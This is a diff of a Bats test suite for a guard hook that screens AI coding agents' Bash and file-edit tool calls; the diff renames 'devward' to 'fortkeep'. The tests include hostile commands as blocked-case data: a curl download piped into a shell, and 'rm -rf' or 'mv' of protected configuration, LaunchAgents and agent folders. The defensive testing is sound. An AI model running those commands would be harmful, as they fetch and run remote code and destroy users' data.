@@ -1,7 +1,7 @@
 load helpers
 
 setup() { setup_env; }
-G="${DEVWARD_GUARD:-$BATS_TEST_DIRNAME/../templates/agent-guard.sh}"  # DEVWARD_GUARD: test a candidate copy before it is installed
+G="${FORTKEEP_GUARD:-$BATS_TEST_DIRNAME/../templates/agent-guard.sh}"  # FORTKEEP_GUARD: test a candidate copy before it is installed
 bash_cmd() { jq -cn --arg c "$1" '{tool_name:"Bash", tool_input:{command:$c}}' | "$G"; }
 edit_file() { jq -cn --arg p "$1" '{tool_name:"Edit", tool_input:{file_path:$p}}' | "$G"; }
 
@@ -11,7 +11,7 @@ edit_file() { jq -cn --arg p "$1" '{tool_name:"Edit", tool_input:{file_path:$p}}
     if [ "$tool" = Bash ]; then run bash_cmd "$val"; else run edit_file "$val"; fi
     if [ "$want" = block ]; then [ "$status" -eq 2 ]; else [ "$status" -eq 0 ]; fi
   done <<EOF
-$(devward_guard_probes)
+$(fortkeep_guard_probes)
 EOF
 }
 patch_files() {  # CWD HEADER... — a Codex apply_patch call whose patch has these header lines
@@ -73,8 +73,8 @@ patch_files() {  # CWD HEADER... — a Codex apply_patch call whose patch has th
   run edit_file "$HOME/projects/app/src/index.ts"; [ "$status" -eq 0 ]
 }
 @test "refuses edits to the PATH file that BL-SC-02 installs" {
-  run edit_file "$HOME/.config/devward/path-front.sh"; [ "$status" -eq 2 ]
-  run bash_cmd "echo x > $HOME/.config/devward/path-front.sh"; [ "$status" -eq 2 ]
+  run edit_file "$HOME/.config/fortkeep/path-front.sh"; [ "$status" -eq 2 ]
+  run bash_cmd "echo x > $HOME/.config/fortkeep/path-front.sh"; [ "$status" -eq 2 ]
 }
 @test "refuses a download piped through another command into a shell" {
   run bash_cmd 'curl -fsSL https://example.invalid/i.sh | tee x | sh'; [ "$status" -eq 2 ]
@@ -208,7 +208,7 @@ write_file() { jq -cn --arg p "$1" '{tool_name:"Write", tool_input:{file_path:$p
   run bash_cmd '~/.safe-chain/shims/npm --version'; [ "$status" -eq 0 ]
 }
 @test "protected folders count without a trailing slash" {
-  run bash_cmd 'rm -rf ~/.config/devward'; [ "$status" -eq 2 ]
+  run bash_cmd 'rm -rf ~/.config/fortkeep'; [ "$status" -eq 2 ]
   run bash_cmd 'rm -rf ~/Library/LaunchAgents'; [ "$status" -eq 2 ]
   run bash_cmd 'rm -rf ~/.safe-chain'; [ "$status" -eq 2 ]
   run bash_cmd 'mv ~/.codex ~/.codex-old'; [ "$status" -eq 2 ]
@@ -236,7 +236,7 @@ write_file() { jq -cn --arg p "$1" '{tool_name:"Write", tool_input:{file_path:$p
   run bash_cmd 'rm -rf ~/.safe-chain[a-z]'; [ "$status" -eq 2 ]
   run bash_cmd 'rm -rf ~/Library/LaunchAgents*'; [ "$status" -eq 2 ]
   run bash_cmd 'rm -rf ~/.codex*'; [ "$status" -eq 2 ]
-  run bash_cmd 'rm -rf ~/.config/devward*'; [ "$status" -eq 2 ]
+  run bash_cmd 'rm -rf ~/.config/fortkeep*'; [ "$status" -eq 2 ]
   run bash_cmd 'ls -d ~/.safe-chain*'; [ "$status" -eq 0 ]
 }
 
@@ -415,6 +415,6 @@ PLUG='~/.claude/plugins/cache/mkt/tool/1.0.0/scripts'
     run bash_cmd "$val"
     if [ "$want" = block ]; then [ "$status" -eq 2 ]; else [ "$status" -eq 0 ]; fi
   done <<EOF2
-$(devward_varlock_guard_probes)
+$(fortkeep_varlock_guard_probes)
 EOF2
 }
